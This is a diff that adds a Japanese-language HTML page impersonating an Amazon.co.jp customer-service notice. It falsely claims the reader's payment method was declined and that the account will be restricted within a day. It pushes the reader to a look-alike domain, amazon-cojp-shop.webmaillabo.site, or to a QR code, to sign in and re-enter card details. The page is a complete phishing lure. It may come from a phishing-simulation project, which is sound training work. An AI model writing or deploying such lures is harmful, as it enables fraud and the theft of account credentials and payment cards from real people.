@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>お支払方法の確認</title>
+    <style>
+        body {
+            font-family: Arial, "Hiragino Sans", "Hiragino Kaku Gothic ProN", Meiryo, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background-color: white;
+            border: 2px solid #333;
+            padding: 20px;
+        }
+        .header {
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .update-button {
+            background-color: white;
+            border: none;
+            color: #0066c0;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: normal;
+            cursor: pointer;
+            text-decoration: underline;
+            display: inline-block;
+        }
+        .update-button:hover {
+            color: #c45500;
+        }
+        .greeting {
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .content {
+            font-size: 13px;
+            line-height: 1.8;
+            margin: 20px 0;
+        }
+        .qr-section {
+            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .qr-code {
+            width: 150px;
+            height: 150px;
+            border: none;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .qr-code img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        .instructions {
+            margin: 20px 0;
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin: 10px 0;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        .signature {
+            margin-top: 30px;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            お支払方法に問題があり、プライム特典をご利用いただけない状況です。
+        </div>
+        
+        <div class="button-row">
+            <a href="https://amazon-cojp-shop.webmaillabo.site" class="update-button">支払方法を更新する</a>
+        </div>
+        
+        <div class="greeting">
+            Amazon利用いただきありがとうございます。
+        </div>
+        
+        <div class="content">
+            お客様のご登録に使用されたお支払い方法が承認されなかったため、現在アカウントの確認手続きが必要となっております。
+            無料サービスをご利用いただく場合でも、ご登録時にご同意いただいたとおり、有効なお支払い方法の確認が求められます
+        </div>
+        
+        <div class="content">
+            このまま 1日以内にお支払いの確認が取れない場合、お客様の Amazon アカウント登録は一時的に制限される可能性があります。
+            引き続きサービスをご利用いただくためには、お支払い方法の更新または追加をお願いいたします。
+
+            なりすまし防止のため、本人確認を伴う手続きを下記の手順に沿って進めてください。
+            お手持ちの携帯電話で以下の QR コードをスキャンし、確認ページへアクセスしてください。
+        </div>
+        
+        <div class="qr-section">
+            <div class="qr-code">
+                  <img src="../static/QR/QR_amazon.png" alt="QRコード">
+            </div>
+        </div>
+        
+        <ol class="instructions">
+            <li>お客様のお支払い方法にアクセス</li>
+            <li>Amazon登録したAmazonアカウントを使用してサインイン<br>
+            登録済みのお支払手段の有効期限を更新、または新しくお支払い手段を追加し、「続行」ボタンをクリック<br>
+            現在ご指定のお支払い方法が承認されない原因は、提携会社(クレジットカード会社等)の事情により異なりますが、利用可能限度額の超過、有効期限切れ、カード利用不可などが考えられます。<br>
+            大変お手数ですが詳細についてはサービスの提供元会社に直接お問い合わせください。</li>
+        </ol>
+        
+        <div class="footer">
+            Amazon.co.jpをご利用いただき、ありがとうございます。<br>
+            今後ともAmazon.co.jpをよろしくお願いいたします。
+        </div>
+        
+        <div class="signature">
+            Amazon.co.jpカスタマーサービス
+        </div>
+    </div>
+</body>
+</html>
